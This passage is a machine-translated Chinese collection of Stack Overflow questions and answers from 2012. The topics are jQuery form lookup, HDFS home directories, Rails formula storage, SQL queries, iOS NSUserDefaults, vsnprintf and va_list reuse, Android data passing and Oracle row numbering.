NSString *formID = [NSString stringWithFormat:@"%@",[self.browser stringByEvaluatingJavaScriptFromString:@"$('form').filter (function() {var text = this.innerHTML.toLowerCase();" 
                        "return text.indexOf('forgot your password') != -1 || "
                        "text.indexOf('remember me') != -1;}).attr('id');"] ]; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T06:10:14.333

```
var loginFormId = $('form').filter(function() {
    return this.innerHTML.indexOf('forgot your password') != -1;
}).attr('id');​ 
```

或者简单地说`:contains`：

```
var loginFormId = $('form:contains("forgot your password")').attr('id');​ 
```

`:contains`选择器[文档](http://api.jquery.com/contains-selector/)：

> 描述：选择所有包含指定文本的元素。匹配的文本可以直接出现在所选元素中、该元素的任何后代中，或者它们的组合中。与属性值选择器一样，:contains() 括号内的文本可以写成裸词或用引号括起来。文本必须具有匹配的大小写才能被选中。

[**现场演示**](http://jsfiddle.net/47V7q/1)

* * *

**更新：**

如果您不确定文本的大小写，则必须使用`filter`：

```
var theFormId = $('form').filter(function() {
    var text = this.innerHTML.toLowerCase(); 
    return text.indexOf('forgot your password') != -1 || 
           text.indexOf('remember me') != -1; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T06:11:26.157

```
var loginForm;
$("form").each(function(){
    if($(this).text().indexOf("Remember me")>=0)
         loginForm = $(this);
}) 
```

# hadoop - HDFS 主目录

> ID：10069568
> 
> 赞同：5
> 
> 时间：2012-04-09T06:07:04.067
> 
> 标签：hadoop, cluster-computing, hdfs, user-permissions

我已经设置了一个单节点多用户 hadoop 集群。在我的集群中，有一个管理员用户负责运行集群（超级用户）。所有其他用户都被分配了一个 hdfs 目录，例如 /home/xyz，其中 xyz 是用户名。

在 unix 中，我们可以在 /etc/passwd 中更改用户的默认主目录。默认情况下，用户的登陆目录是主目录。

如何在 hadoop 中为 hdfs 文件系统执行此操作。例如，如果用户在 unix 提示符下键入：$hadoop dfs -ls。它将列出我分配的主目录的内容。

此外，hdfs 目录由运行集群的超级用户（hadoop 超级用户而不是 unix root）创建，然后将所有权转移给特定用户。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-09T10:30:32.920

我不确定这是可以配置的东西 - [DistributedFileSystem](http://svn.apache.org/viewvc/hadoop/common/trunk/hadoop-hdfs-project/hadoop-hdfs/src/main/java/org/apache/hadoop/hdfs/DistributedFileSystem.java?view=markup)的源代码（第 150 行）调用了似乎是硬编码的 getHomeDirectory：

```
@Override
public Path getHomeDirectory() {
  return makeQualified(new Path("/user/" + dfs.ugi.getShortUserName()));
} 
```

如果您希望能够更改此设置，您确实有两种可能的选择：

*   向 hadoop 提交工单，要求提供新功能 -[请参阅此链接](http://hadoop.apache.org/common/issue_tracking.html)
*   自己修改源代码并在整个集群中重新构建 + 重新分发 hadoop-core jar（在单节点伪集群中很简单）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T03:22:07.070

Tapan，每个用户在 HDFS 中都有一个位于 /user/username 的“主”目录。例如，如果您键入 hadoop fs -ls，它将带您到当前的 HDFS 用户目录。我和两个用户一起检查了它。

来到 unix 之类的文件（/etc/passwd）设置，我不知道。但是，这真的很有趣。正如克里斯所说，我们可以添加新功能，例如引入 user-admin-site.xml 配置文件并添加组、用户对目录的权限、主目录等。真的很有趣，我们可以试试这个......

# ruby-on-rails - 在 Ruby on Rails 中存储复杂的公式

> ID：10069574
> 
> 赞同：2
> 
> 时间：2012-04-09T06:08:15.863
> 
> 标签：ruby-on-rails

我正在构建一个需要计算各种公司的销售佣金的 RoR 应用程序。随着新公司开始使用它，应用程序上线后将会有新的佣金模式。这些佣金通常表示为复杂的 MS Excel 公式，但并非总是如此。我需要将这些重新实现到 Ruby 中。

例如，佣金模型可能是将以下几行**加在一起**：

```
column_1 * ( column_2 / column_3)
if ( column_6 > column_1 ) column_5 * column_4
if ( column_2 < column_1 ) column_2 
```

鉴于上线后会有新的佣金模型，将这些模型存储在数据库中的最佳方式是什么？（这部分不需要过于用户友好，只有开发人员会添加新模型）

显然，这可以通过`eval`从数据库中读取上述内容来完成。除了安全问题之外，它感觉不像是一个“干净”的解决方案。

我还能如何解决这个问题？

我一直在研究 DSL，使用 Excel 文件作为黑盒计算器、公式宝石，我正在努力寻找一种很好的方法来做到这一点。

TIA

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T22:20:34.347

回复：使用 excel 文件作为黑盒计算器，我使用[axlsx](http://axlsx.blogspot.com/2012/04/deeper-look-excel-reporting-in-ruby.html)在 Ruby 中生成 excel 文件，我认为这样的东西可能对你有用：

```
require 'axlsx'
Axlsx::Package.new do |p|
  p.workbook do |wb|  
    wb.add_worksheet do |sheet|
      sheet.add_row [column_1,column_2,column_3]
      sheet.add_row ["=A1*(B1/C1)"]
    end
  end
  p.serialize('results.xlsx')
end 
```

但是，由于公式实际上是由 excel 执行的，因此您无法以这种方式在代码中访问它们，只能在 Excel 输出中访问它们。

我知道这是一个一个月前的问题，所以我很好奇你做了什么，如果有的话。

# java - 通过java创建iis应用程序

> ID：10069581
> 
> 赞同：0
> 
> 时间：2012-04-09T06:08:56.517
> 
> 标签：java, .net, iis

我们已经构建了几个基于 .net 的 Web 服务。

现在我们要创建一个统一的 UI 来管理这些基于 Web 的服务。

但是我们想在这个系统中使用java，所以我们必须在java中创建/启动/停止iis应用程序。

我想知道这是否可能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T07:12:38.573

[有一个名为appcmd](http://technet.microsoft.com/en-us/library/cc772200%28v=ws.10%29.aspx)的用于管理 IIS Web 应用程序的命令行工具。此外，还有*iisreset*、*net start*和*net stop*。

*您可以使用Runtime.exec*或*ProcessBuilder*类从 Java 调用这些命令行工具。最有可能需要提升的特权。因此，您的 Java 应用程序也需要以提升的权限运行。

我不太确定这对于您的管理应用程序是否已经足够。您没有提到任何有关查询 Web 应用程序及其状态的内容。不是也需要吗？

# sql - 使用 if 条件合并两个 sql 查询

> ID：10069585
> 
> 赞同：1
> 
> 时间：2012-04-09T06:09:24.523
> 
> 标签：sql, sql-server, oracle, select, intersect

我想合并两个查询。

我有 Query1 返回一些 ID。

然后我有 Query2，它首先检查表中是否存在一些 Id。如果否，则结果将是 Query1 返回的 Id。

如果是，那么我想要 Query1 和 Query2 返回的常见 Id，例如 Query1 和 Query2 返回的 Id 的交集。

那么我怎样才能在一个查询中做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T05:32:55.480

这可以使用 DECODE 和 CASE 语句的组合来实现

```
 SELECT DISTINCT BT1.ID
  FROM BUFFER_TABLE_1 BT1, BUFFER_TABLE_2 BT2
 WHERE DECODE((SELECT COUNT(BT1.ID)
                FROM BUFFER_TABLE_1 BT1, BUFFER_TABLE_2 BT2
               WHERE BT1.ID = BT2.ID),
              0,
              'TRUE',
              (SELECT CASE
                        WHEN BT1.ID = BT2.ID THEN
                         'TRUE'
                        ELSE
                         'FALSE'
                      END
                 FROM DUAL)) = 'TRUE'
 ORDER BY BT1.ID 
```

主要部分在解码中使用，如果两个表中的匹配 ID 计数为零，则从第一个表（BUFFER_TABLE_1）返回所有 ID。但是，如果此计数大于 0，则两个表中的 ID 都匹配，并且仅返回公共 ID

希望能帮助到你

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:19:04.227

(For people who have already read my answer: It has been hugely re-edited because of the comments of [@nawfal](https://stackoverflow.com/users/661933/nawfal) that I want to preserve)

First I want to clarify that I understood your problem correct.

You have the Parts:

1.  `select id from table1` That produces Result1
2.  `select id from table2 where <some condition>` That produces Result2
3.  `select count(id) > 0 from table2 where <some condition>` That decides what result to use

If 3\. returns more than 1 then you want the rows that are returned by 1\. AND 2\. (but not the ones that are only returned by 1\. OR only by 2.)

If 3\. returns 0 then you want the results of 1.

-> The solution is to have 3\. in a view and select it in a where clause of a union statement TWICE.

Like this:

```
SELECT t1.id FROM table1 t1 WHERE 
       (SELECT COUNT(t2.id) from table2 t2 where <some condition>) = 0
UNION
select t2.id from table2 t2 WHERE <some condition> 
       AND t2.id IN (SELECT t1.id FROM table1 t1)
       AND (SELECT COUNT(t2.id) from table2 t2 where <some condition>) > 0 
```

one of the two parts will always be empty (because query 3\. can't be = 0 and > 0 at the same time)

# iphone - 如何保留数组的值

> ID：10069593
> 
> 赞同：0
> 
> 时间：2012-04-09T06:10:03.053
> 
> 标签：iphone, objective-c, ios5, xcode4, nsuserdefaults

我有两个视图控制器。第一个与另一个视图控制器有一个segue。对于后一个视图控制器，我想要的是添加来自文本字段的项目，然后通过单击按钮将其保存在数组中。然后这个数组将使用 NSUserDefaults 保存。

在下面的代码中，我可以成功地将项目存储在我的数组中。这个数组也使用 NSUserDefaults 保存。然而，当我回到我的第一个视图控制器，然后再次进入我的第二个视图控制器以在我的数组上添加新项目时，我之前存储的项目已经消失了。新添加的项目是唯一保存的项目。

请指教:)

在我的 .h 文件中

```
@interface AddCardViewController : UIViewController <UITextFieldDelegate>

@property (strong, nonatomic) IBOutlet UITextField *cardNameTextField;

@end 
```

在我的 .m 文件中

```
@interface AddCardViewController ()

@property (nonatomic, strong)NSMutableArray *nameOfCards;

@end

@implementation AddCardViewController 

@synthesize cardNameTextField = _cardNameTextField;

@synthesize nameOfCards = _nameOfCards;

// setting my array
- (NSMutableArray *)nameOfCards 
{
    if (!_nameOfCards) _nameOfCards = [[NSMutableArray alloc] init];

    return _nameOfCards;
}

- (void) viewWillAppear:(BOOL)animated{
    [super viewWillAppear:animated];

    self.cardNameTextField.delegate = self;
}

- (BOOL) textFieldShouldReturn:(UITextField *)textField{

    [self.cardNameTextField resignFirstResponder];

    return YES;
}

- (void)viewDidLoad
{
    //getting the data saved

    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];

    NSMutableArray *cardName = [defaults objectForKey:@"cardName"];

    NSLog(@"contents of my array %@", cardName);

    [super viewDidLoad];

}

- (IBAction)addNewCard:(id)sender {
    [self.nameOfCards addObject:self.cardNameTextField.text];
    NSLog(@"contents :%@", _nameOfCards);

    // this is how to save the data

    NSMutableArray *cardName = _nameOfCards;

    NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];

    [defaults setObject:cardName forKey:@"cardName"];

    [defaults synchronize];

    NSLog(@"data saved");

}

@end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T04:11:03.660

从中检索的对象`NSUserDefaults`始终是不可变的，即使您为键设置了可变对象。您可以将其视为 NSUserDefaults 制作副本。

如果您需要基于 中存储的内容的可变对象`NSUserDefaults`，请制作一个可变副本。例如：

```
NSMutableArray *cardName = [[[defaults objectForKey:@"cardName"] mutableCopy] autorelease]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:29:49.160

正如上面给出的代码所示，您只是设置了新创建的 cardname 对象，我认为您必须首先从 nsuserdefaluts 获取所有数据并将它们添加到您的 _nameOfCards 数组中，然后在 addNewCard:(id)sender 方法中添加您的新对象，例如

```
NSUserDefaults *defaults = [NSUserDefaults standardUserDefaults];

NSMutableArray *cardName = [defaults objectForKey:@"cardName"];
self.nameOfCards = cardName;

[self.nameOfCards addObject:self.cardNameTextField.text];

NSMutableArray *finalCardNames = [[NSMutableArray alloc] initWithArray:self.nameOfCards copyItems:YES];

[defaults setObject:finalCardNames forKey:@"cardName"];

[defaults synchronize]; 
```

我想这会解决你的问题试试它有美好的一天

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T18:01:54.327

尝试使用单例，而不是。在这里查看我的答案：[https](https://stackoverflow.com/a/10093449/542400) ://stackoverflow.com/a/10093449/542400但将其设为 NSArray 而不是字典。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-24T07:37:46.243

使用 NSMutableArray 比使用 NSArray 更好，因为你可以在 NSMutableArray 中编辑、添加和删除元素。希望这可以帮助。

# python - Chrome 和 Firefox 中的会话处理

> ID：10069594
> 
> 赞同：1
> 
> 时间：2012-04-09T06:10:06.170
> 
> 标签：python, google-app-engine, firefox, google-chrome, tipfy

我对 Chrome 和 Firefox 中的会话处理有疑问。在对网站进行身份验证时，我将其关闭并在 Firefox 中重新打开主页，它会显示我的名字。但是当我在 chrome 中做同样的事情时，它没有显示我的名字。它显示为客人。该站点的会话由tipfy 实现。我必须配置会话管理吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T08:08:11.790

检查Tipfy会话配置属性，检查路径属性'/'你需要做一些修改他们

# c - 关于 vsnprintf（采访）

> ID：10069597
> 
> 赞同：3
> 
> 时间：2012-04-09T06:10:19.810
> 
> 标签：c, printf, crt

在一次采访中，我被要求（除其他外）实现以下功能：

```
int StrPrintF(char **psz, const char *szFmt, ...); 
```

类似于`sprintf`，除了不是已经分配的存储，函数必须自己分配它，并在`*psz`变量中返回。此外，`*psz`可能指向一个已经分配的字符串（在堆上），它可能会在格式化期间使用。自然，该字符串必须通过适当的方式释放。

返回值应该是新创建的字符串的长度，或者错误时为负值。

这是我的实现：

```
int StrPrintF(char **psz, const char *szFmt, ...)
{
    va_list args;
    int nLen;

    va_start(args, szFmt);

    if ((nLen = vsnprintf(NULL, 0, szFmt, args)) >= 0)
    {
        char *szRes = (char*) malloc(nLen + 1);
        if (szRes)
            if (vsnprintf(szRes, nLen + 1, szFmt, args) == nLen)
            {
                free(*psz);
                *psz = szRes;
            }
            else
            {
                free(szRes);
                nLen = -1;
            }
        else
            nLen = -1;
    }

    va_end(args);
    return nLen;
} 
```

问题作者声称此实现存在错误。不仅仅是在特定深奥系统上*可能*失败的标准违规，而是一个“真正的”错误，它可能在大多数系统上偶然失败。

它也与使用 of`int`而不是适合内存能力的类型无关，例如`size_t`or `ptrdiff_t`。说，字符串的大小是“合理的”。

我真的不知道这个错误可能是什么。恕我直言，所有指针算术都可以。我什至不认为两个后续调用会`vsnprintf`产生相同的结果。恕我直言，所有可变参数处理的东西也是正确的。`va_copy`不需要（这是使用 的被调用者的责任`va_list`）。也在x86上`va_copy`并且`va_end`没有意义。

如果有人能发现（潜在的）错误，我将不胜感激。

**编辑：**

查看答案和评论后 - 我想添加一些注释：

*   自然地，我已经使用各种输入构建并运行了代码，包括在调试器中一步一步地观察变量状态。如果不先亲自尝试，我永远不会寻求帮助。我没有看到任何问题，没有堆栈/堆损坏等。我还在调试版本中运行它，启用了调试堆（它不能容忍堆损坏）。
*   我假设函数是使用有效参数调用的，即`psz`是一个有效的指针（不要与 混淆`*psz`），`szFmt`是一个有效的格式说明符，并且所有可变参数都被评估并对应于格式字符串。
*   根据标准，`free`用指针调用是可以的。`NULL`
*   `vsnprintf`使用`NULL`指针和大小 = 0可以调用。它应该返回结果字符串长度。MS 版本虽然不完全符合标准，但在这种特定情况下也是如此。
*   `vsnprintf`不会超过指定的缓冲区大小，包括 0 终止符。意味着 - 它并不总是放置它。
*   请把编码风格放在一边（如果你不喜欢它——我很好）。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-09T08:14:09.610

> 不需要 va_copy（这是使用 va_list 的被调用者的责任）

不太对。`vsnprintf`我在 C11 标准中没有找到任何这样的要求。它确实在脚注中这样说：

> 由于函数 vfprintf、vfscanf、vprintf、vscanf、vsnprintf、vsprintf 和 vsscanf 调用 va_arg 宏，**返回后的 arg 的值是不确定的**。

当您调用`vsnprintf`时，`va_list`可以通过值或引用传递（就我们所知，它是一种不透明的类型）。所以第一个`vsnprintf`实际上可以修改`va_list`和破坏第二个。推荐的方法是使用`va_copy`.

事实上，根据[这篇文章](http://www.bailopan.net/blog/?p=30)，它不会在 x86 上以这种方式发生，但它会在 x64 上发生。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T06:25:35.717

vsnprintf 的第一个参数不应为空，根据：

[http://msdn.microsoft.com/en-us/library/1kt27hek(v=vs.80).aspx](http://msdn.microsoft.com/en-us/library/1kt27hek(v=vs.80).aspx)

编辑 1：如果 *psz 为空，则不应释放它！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-04-09T17:58:34.620

第一次调用 vsnprintf() 实际上是尝试获取最终字符串的长度。但是，它有一个副作用！它也将变量参数移动到列表中的下一个参数。因此，对 vsnprintf() 的下一次调用没有捕获列表中的第一个参数。简单的技巧是从第一个 vsnprintf() 获得长度后重新设置变量参数列表以重新开始。也许还有另一种方法可以做得更好，但是，是的，这就是问题所在。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T07:12:44.837

> 此外，*psz 可能指向一个已经分配的字符串（在堆上），它可能会在格式化期间使用。

为了`*psz`潜在地可重用，需要一些指示它是垃圾还是有效的堆指针。如果没有函数参数表明，您可以假设 NULL 哨兵值的唯一合理约定....即，如果`*psz`不是 NULL，那么您可以重用它，前提是您希望格式化的数据可以适合相同的空间。由于该函数没有给出任何先前分配的内存量的指示，您可以： - 使用 realloc 并信任它以避免不必要的缓冲区移动 - 推断最小预先存在的缓冲区大小`strlen()`- 这意味着如果你'说写一个长字符串然后一个短字符串然后将原始长字符串写入缓冲区，最后一个操作将不必要地替换缓冲区。

显然 realloc 是一个更好的选择。

```
int StrPrintF(char **psz, const char *szFmt, ...)
{
     va_list args;
     int nLen;
     va_start(args, szFmt);
     if ((nLen = vsnprintf(NULL, 0, szFmt, args)) >= 0)
     {
         char *szRes = (char*) realloc(psz, nLen + 1);
                             // ^ realloc does a fresh allocation is *psz == NULL
         if (szRes)
             vsnprintf(*psz = szRes, nLen + 1, szFmt, args); // can't fail
                       // ^ note the assignment....
         else
             nLen = -1;
     }
     va_end(args);
     return nLen;
} 
```

还要注意 - 来自 Linux 手册页`printf()`- 如果你`sprintf()`没有返回有用的长度，你必须获取/编写一个实现......

> 关于 snprintf() 的返回值，SUSv2 和 C99 相互矛盾：当使用 size=0 调用 snprintf() 时，SUSv2 规定未指定的返回值小于 1，而 C99 在这种情况下允许 str 为 NULL，并给出返回值（一如既往）作为在输出字符串足够大的情况下将写入的字符数。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-04-09T06:21:15.257

没有直接给你答案：检查你的输入。

# mysql - 将 not in 命令与 find in set 一起使用

> ID：10069599
> 
> 赞同：1
> 
> 时间：2012-04-09T06:10:28.780
> 
> 标签：mysql

我有这样的查询

```
SELECT user_id
FROM user
WHERE user_id NOT 
IN (
 FIND_IN_SET( user.user_id,  '1,2,3,4,7,8,21,42,12' )
) 
```

但它不能正常工作，当系列继续时，它只会打印不存在的 id。由于 1,2,3,4 是连续的，因此我的结果中仅不存在此 ID，但我希望列表中不存在完整列表。

我在 set SELECT user_id FROM user WHERE user_id NOT IN ( FIND_IN_SET(user.user_id, block_id(1) ) 中调用函数，它给了我逗号分隔值的字符串，当我传递字符串 ex WHERE user_id NOT IN ( '1,2,3,4,5,7,8,9' ）它只忽略第一个值，所以请帮忙

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T06:33:53.660

```
SELECT user_id
FROM user
WHERE user_id NOT 
IN ( 1,2,3,4,7,8,21,42,12 ); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T06:16:53.547

我不确定你是否理解`FIND_IN_SET`它的作用——这个函数为你提供了搜索值的*位置*（或索引）。因此，如果`user_id`是 = 7，它将返回 5。这基本上会使您的 SQL 函数无用，因为您正在将单个用户 ID 与索引进行比较，它等同于：

给定 user_id = 7：

```
SELECT user_id
FROM user
WHERE user_id NOT 
IN ( 5 ) 
```

# php - 建议为移动设备开发zend应用程序的良好实践

> ID：10069600
> 
> 赞同：-2
> 
> 时间：2012-04-09T06:10:28.983
> 
> 标签：php, zend-framework

> **可能重复：**
> [根据用户用于浏览的设备（android tab，iphone，ipad）动态更改zend中的布局和模板](https://stackoverflow.com/questions/10027193/change-layout-and-template-in-zend-dynamically-according-to-the-deviceandroid-t)

我正在开发一个杂志商店，它必须在不同设备上加载为 web 视图，我有两种方法。

1.  根据设备更改引导文件中的模板和视图路径文件夹
2.  为不同的设备制作不同的模块。

    注意：设备分辨率，ht和width已经根据分辨率模板选择过程进行了分析。

在上述建议中提出更好的解决方案或分享您的其他想法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:41:40.567

考虑使用[响应式网页设计](http://www.alistapart.com/articles/responsive-web-design/)。

# ios - 如何从 App Store 实现自动更新 iOS 应用程序？

> ID：10069602
> 
> 赞同：0
> 
> 时间：2012-04-09T06:10:51.103
> 
> 标签：ios

旧版本如何与 App Store 通信，并找到可用的新版本？我对这个问题没有任何想法。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:24:10.183

应用程序更新由操作系统处理。当您的应用程序可用时，用户会收到通知。他们可以选择更新。因此，您无法秘密更新。

您的应用程序可以利用外部服务器来实现其部分功能，在某些情况下实现相同的结果。

您还可以在您的应用程序运行时通知用户可用的更新。

# sql-server-2008 - 如何将vmware上的sql server 2008与本地机器sql server 2008客户端连接起来

> ID：10069603
> 
> 赞同：0
> 
> 时间：2012-04-09T06:10:51.320
> 
> 标签：sql-server-2008, database-connection, vmware, sqlclient

我有windows7专业版机器。我用 sql server 2008 设置了 VMware（windows server 2008）。此外，我还设置了 sql server 2008 客户端应用程序。我想从本地机器 sql server 客户端机器访问 vm 数据库上的 sql server 2008。我应该怎么做？我需要配置什么设置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T18:31:53.153

通常，您应该将虚拟机视为网络上的独立计算机。要从主机访问数据库，您需要遵循与在一台计算机上安装服务器和在另一台计算机上安装客户端时相同的步骤（防火墙、安全配置、选择允许的协议、DNS 或 IP 等）。我建议您搜索有关如何安装和配置 SQL Server 以在网络上使用的一般说明。

# c# - 如何像Rapidminer在其基于Java的软件中那样构建包含由模块组成的流程图的winform应用程序

> ID：10069606
> 
> 赞同：0
> 
> 时间：2012-04-09T06:11:19.577
> 
> 标签：c#, winforms, visual-studio, diagram

我正在编写基于 c#、winform 的软件。该软件的目标是让用户完成一个流程设计。该过程必须包括许多步骤，例如读取数据，检查数据，输出图形。所有这些子步骤都像一个对象。为了易于使用和更好的可视化，我想将子步骤预先设计为模块，并允许使用将预先定义的模块拖到一个空间中并连接它们，也可以编译它们以检查有效性并让它们最终运行该过程.

我发现了一个名为 rapidminer 的好软件，它具有我上面描述的类似模块概念。![在此处输入图像描述](../Images/d8a7f7114798d6d6333ca7239547badd.png)

如您所见，您可以将一些不错的数学模块拖到中央空白区域并将它们连接在一起以形成完整的建模过程。

如何在 Visual Studio 的 c# winform 软件中创建类似的功能？

非常感谢提前！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-29T17:46:09.790

使用 Rehosted Designer 从 MS 进行工作流的运行时设计。它完美而美丽。

# java - 将数据从一个活动传递到另一个活动，但稍后再转到另一个活动

> ID：10069609
> 
> 赞同：0
> 
> 时间：2012-04-09T06:11:54.307
> 
> 标签：java, android, android-activity

我的工作流程如下：

LoginActivity -> ActivityB -> ActivityC -> ActivityD

我想将数据从 LoginActivity 传递给 ActivityD，但不直接传递给 ActivityD。即，我想将数据从 LoginActivity 传递给 ActivityD，但在我到达 ActivityD 并在那里获取数据之前先转到 ActivityB 和 ActivityC。

这可能吗？

我知道将数据从一个活动传递到另一个活动，代码如下：

```
 Intent i = new Intent(getApplicationContext(), AnotherActivity.class); 
        i.putExtra("key", (int)1); 
        i.putExtra("something", something); 
        startActivity(i); 
```

并在`AnotherActivity`您执行以下操作以获取数据：

```
 Bundle extras = getIntent().getExtras();   
        if(extras !=null) 
        {  
            String var = extras.getString("something");
        } 
```

但是，如果我想延迟直接参加活动，这不起作用。所以如果我出去`startActivity(i);`参加另一个活动。在最终活动中获取数据时程序崩溃。好的旧 NullPointerExeption 弹出。

有谁知道做我所描述的事情的方法？从一个活动获取数据到另一个活动，但不立即开始（或开始）该活动？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:20:11.193

如果您想像这样传递数据，最好使用共享首选项。它使用简单，您可以在程序中的任何位置使用数据。

```
SharedPreferences.Editor editor = prefs.edit();
editor.putString("key", (int)1);
editor.putString("something", something);
editor.commit(); 
```

收货时：

```
SharedPreferences prefs = getSharedPreferences(prefName, MODE_PRIVATE); 
String something = prefs.getString("something", null); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T06:16:11.640

您可以随时使用其中任何一个

```
•A singleton pattern to share the date across multiple non-consecutive activities.

•A shared preference.

•An external storage

•Entry into db.

•passing data with intents. 
```

此[链接](http://developer.android.com/resources/faq/framework.html#3)将为您提供更多详细信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T06:16:46.577

我可以想到两种解决您问题的方法。一是你只是不断地传递数据，这意味着在 ACtivityB 和 ACtivityC 中你需要运行代码

```
Intent i = new Intent(getApplicationContext(), AnotherActivity.class); 
i.putExtra("key", (int)1); 
i.putExtra("something", something); 
startActivity(i); 
```

另一种选择（我认为更实用）是创建一个单独的类，其中包含用于访问数据的静态成员和静态方法。它可能看起来像这样

```
public class SharedResource{
public static String mPassedName;
} 
```

此类不一定是线程安全的，因此请预先警告，如果您具有多线程访问权限，请采取适当的预防措施。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T06:36:14.090

你可以通过两种方法来做到这一点。 **1) 共享偏好**

```
SharedPreferences.Editor editor = prefs.edit();
editor.putString("key", "Value");
editor.commit(); 
```

// 获取共享首选项。

```
 String value = pref.getString("key" , ""); 
```

2）定义应用程序级类和访问相同。

类 由变量的 getter 和 setter 函数组成。设置一项活动并进入另一项活动。

# java - 如何在java中的对象数组中应用二进制搜索？

> ID：10069612
> 
> 赞同：0
> 
> 时间：2012-04-09T06:12:09.347
> 
> 标签：java, mysql

我已经在对象数组中获取了一个表的内容。并且该对象将表 COUNTRYCODES 的列保存到其自己的数据成员中，这些数据成员的名称是，startingRange，endingRange 和 countryCode。

实际上该表描述的是对应于该表的startingRange和endingRange范围的国家代码。现在我已将此表存储在名称为 countryCodes[] 的对象数组中。我需要通过给出一个可以在任何范围之间（即在任何起始范围和结束范围之间）的范围来从数组中搜索国家代码。

为此，我想使用二进制搜索，因为我不想按位置搜索国家代码位置。为了尽量减少搜索工作，我想使用二进制搜索。请帮助指导我。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:16:54.953

你的问题有点模糊，但你可以做的是：

假设数组*已经排序*，您可以使用[Arrays.binarySearch](http://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html#binarySearch%28java.lang.Object%5B%5D,%20java.lang.Object%29)机制对数组执行二进制搜索。

# sql - SQL按记录号查询

> ID：10069614
> 
> 赞同：1
> 
> 时间：2012-04-09T06:12:35.283
> 
> 标签：sql, oracle

关于这个问题，Oracle 平台没有给出任何解决方案/答案。 [在 SQL 查询中选择第 N 条记录](https://stackoverflow.com/questions/1022514/selecting-nth-record-in-an-sql-query)

没有排序或分组或 where 子句。根据插入的记录排序。

原因是，我的应用程序日志指出记录号 7、34、46 正在引发错误。有什么正确的存档方法吗？

提前谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-09T06:20:15.950

据我所知，该链接中接受的答案（几乎）对 Oracle 完全有效：

```
WITH OrderedOrders AS
(
    SELECT SalesOrderID, OrderDate,
    ROW_NUMBER() OVER (ORDER BY OrderDate) AS "RowNumber"
    FROM Sales.SalesOrderHeader 
)  
SELECT * 
FROM OrderedOrders 
WHERE "RowNumber" = 5; 
```

Oracle 有一个遵循此语法的分析函数 ROW_NUMBER()。我将列别名的单引号更改为双引号，但我认为其他一切都很好。

更新：

至于根据插入时间检索第 N 条记录，您不能依赖 Oracle 为您维护插入顺序。如果您不指定排序顺序，则无法保证您的结果将以什么顺序返回。如果您有一个始终由序列填充的主键，则可以使用它来排序。或者，您可以在插入时填充时间戳列并使用它来排序。长话短说，如果不指定排序顺序，您将无法进行有意义的第 N 条记录查询。

# mysql - 在特定关键字之后从数据库中查找前 4 个单词和后 4 个单词？

> ID：10069616
> 
> 赞同：8
> 
> 时间：2012-04-09T06:13:02.587
> 
> 标签：mysql

我想从数据库中找到特定关键字之后的前 4 个单词和后 4 个单词。假设关键字是`"Account"`然后我想找到出现在一行之前的前 4 个单词`"Account"`和出现在一行之后的 4 个单词`"Account"`。

目前我正在使用此查询来查找特定关键字之后的前 20 个字符和后 20 个字符。

```
SELECT 
SUBSTRING(line.WD, LOCATE('%Account%', line.WD) - 20, 20) AS First20Char, 
SUBSTRING(line.WD, LOCATE('%Account%', line.WD)+LENGTH('a'), 20) AS Last20Char 
FROM `line` WHERE line.WD LIKE '%Account%' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T06:32:52.330

SQL 被称为 * *S* *QL 是有原因的——如果没有中间编程语言的帮助，你将无法做如此高级的事情——除非你想让事情变得混乱。

简短的回答是，您必须先使用 UDF（用户定义函数）进行拆分，然后解析分隔字符串（在空格 ' ' 上），然后您可以应用 -4/+4 逻辑。

这是网上关于 SQL-UDF 的最佳文章，可帮助您入门：

[http://www.codeproject.com/Articles/7938/SQL-User-Defined-Function-to-Parse-a-Delimited-Str](http://www.codeproject.com/Articles/7938/SQL-User-Defined-Function-to-Parse-a-Delimited-Str)

祝你好运！

PS - 抓住你的+/- 30 chr然后在外部进行解析会容易得多=]。它也可能会节省更多的系统资源。

# php - 从不同的域 src iframe 设置 cookie

> ID：10069619
> 
> 赞同：1
> 
> 时间：2012-04-09T06:13:09.263
> 
> 标签：php, security, iframe, cookies, cross-domain

这是有问题的页面： [http ://www.customazon.com/demo](http://www.customazon.com/demo)

